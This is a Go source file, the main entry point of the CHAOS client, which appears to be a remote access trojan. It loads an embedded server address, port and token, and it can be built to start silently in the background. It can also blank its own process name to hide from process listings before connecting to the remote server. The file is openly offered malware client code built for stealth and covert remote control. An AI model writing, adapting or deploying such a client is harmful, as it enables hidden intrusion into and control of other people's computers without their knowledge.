package main

import (
	_ "embed"
	"log"

	"github.com/tiagorlampert/CHAOS/client/app"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/ui"
	"github.com/tiagorlampert/CHAOS/client/app/utils"
	"github.com/tiagorlampert/CHAOS/client/app/utils/process"
)

var (
	Version = "dev"
	// RunHidden is set at build time to start the client silently.
	RunHidden = "false"
	// MaskName is set at build time to hide the process from process listings.
	MaskName = "false"
)

//go:embed config.json
var configFile []byte

func main() {
	config := utils.ReadConfigFile(configFile)

	hidden := process.ParseRunHidden(RunHidden)
	if hidden {
		detached, err := process.Hide()
		if err != nil {
			log.Println("error starting in background:", err)
		}
		if detached {
			return
		}
	}

	if process.ParseMaskName(MaskName) {
		process.SetName(process.EmptyName)
	}

	if !hidden {
		ui.ShowMenu(Version, config.ServerAddress, config.Port)
	}

	app.New(environment.Load(config.ServerAddress, config.Port, config.Token)).Run()
}
